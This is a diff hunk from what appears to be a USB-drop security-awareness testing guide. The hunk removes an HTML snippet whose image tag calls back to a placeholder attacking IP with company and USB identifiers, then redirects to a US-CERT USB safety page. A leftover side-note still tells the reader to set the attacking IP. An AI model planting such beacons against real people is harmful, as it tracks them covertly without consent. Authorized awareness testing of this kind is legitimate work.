@@ -392,13 +392,7 @@ How to do it
 
 HTML file creation  
 - Save the following code as an HTML file, be sure to modify line 2 parameters (COMPANY1 and USB)
-```<html><head><meta charset="UTF-8" />
-<img src=http://<ATTACKING_IP>/<COMPANY_DESC>/?usb=<USB_DESC>,method=HTML">
-<meta http-equiv="refresh" content="1;url=https://www.us-cert.gov/ncas/tips/ST08-001" />
-<script type="text/javascript">window.location.href = "https://www.us-cert.gov/ncas/tips/ST08-001"</script>
-<title>Page Redirection</title></head>
-<body>If you are not redirected automatically, follow the <a href="https://www.us-cert.gov/ncas/tips/ST08-001">link</a>.</body></html>
-```  
+
 
 **Side-Note:** Be sure to update line 2 with the appropriate attacking IP, company description, and USB description.
 {: .notice--info}  
